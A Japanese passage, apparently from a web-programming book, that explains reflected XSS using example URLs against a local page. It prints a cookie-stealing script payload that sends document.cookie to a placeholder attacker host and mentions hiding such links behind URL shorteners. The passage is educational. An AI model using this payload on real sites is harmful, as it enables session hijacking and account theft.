Webアプリケーションはユーザが送信したリクエストのデータに対し十分な検査およびフィルタリングを行なっていないと、ユーザが送信するデータにHTMLコードを許してしまい(主に">"、"<")、エスケープされていない悪意あるコードを第三者であるユーザのブラウザ上で解釈/実行させてしまいます。これがXSSセキュリティホールを生み出す原因となっています。

以下ではリフレクション型XSSを例にXSSのプロセスをご説明します:パラメータによってユーザの名前を出力するページがあるとします。例えばurl:\texttt{http://127.0.0.1/?name=astaxie}にアクセスすると、ブラウザでは以下のような情報を出力します:

\begin{lstlisting}[numbers=none]
hello astaxie
\end{lstlisting}

もし我々が\texttt{http://127.0.0.1/?name=\&\#60;script\&\#62;alert(\&\#39;astaxie,xss\&\#39;)\&\#60;/script\&\#62;}のようなurlを送信した場合、ブラウザがダイアログを表示することに気づくでしょう。これはつまり、ページにXSSセキュリティホールが存在することを示しています。では悪意あるユーザはどのようにしてCookieを盗み出すのでしょうか?上と同じように、\texttt{http://127.0.0.1/?name=\&\#60;script\&\#62;document.location.href=\\'http://www.xxx.com/cookie?'+document.cookie\&\#60;/script\&\#62;}というurlでは、現在のcookieが指定されたページ、\texttt{www.xxx.com}に送信されます。このようなURLは一目見て問題があるとわかると思われるかもしれません。いったい誰がクリックするのかと。そうです。このようなURLは人に疑われがちです。しかしURL短縮サービスを使ってこれを短縮した場合、あなたは気づくことができるでしょうか?攻撃者は短縮されたurlをなんらかの経路で広め、真相を知らないユーザが一旦このようなurlをクリックすることで、対応するcookieデータがあらかじめ設定されたページに送信されてしまいます。このようにユーザのcookie情報を盗んだあとは、Websleuthといったツールを使うことでこのユーザのアカウントを盗み出すことができるか検査されてしまいます。
